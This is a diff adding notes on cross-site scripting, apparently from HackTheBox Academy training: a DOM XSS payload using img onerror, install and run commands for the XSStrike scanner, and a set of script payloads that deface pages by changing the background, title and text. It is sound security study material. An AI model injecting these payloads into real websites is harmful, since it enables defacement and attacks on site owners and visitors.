@@ -31,3 +31,35 @@ Furthermore, some of the `jQuery` library functions that write to DOM objects 
 - `add()`
 - `after()`
 - `append()`
+
+**DOM Attack** :  `<img src="" onerror=alert(window.origin)>`
+
+## Automated Discovery
+**XSStrike**
+To install : 
+```
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+python xsstrike.py
+```
+
+To run the script : `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`
+
+## Defacement Elements
+
+We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn't really the primary target.
+
+Four HTML elements are usually utilized to change the main look of a web page:
+
+- Background Color `document.body.style.background`
+- Background `document.body.background`
+- Page Title `document.title`
+- Page Text `DOM.innerHTML`
+
+Defacing Payloads : 
+- `<script>document.body.style.background = "#141d2b"</script>`
+- `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`
+- `<script>document.title = 'HackTheBox Academy'</script>`
+- `document.getElementById("todo").innerHTML = "New Text"`
+- jQuery : `$("#todo").html('New Text');`
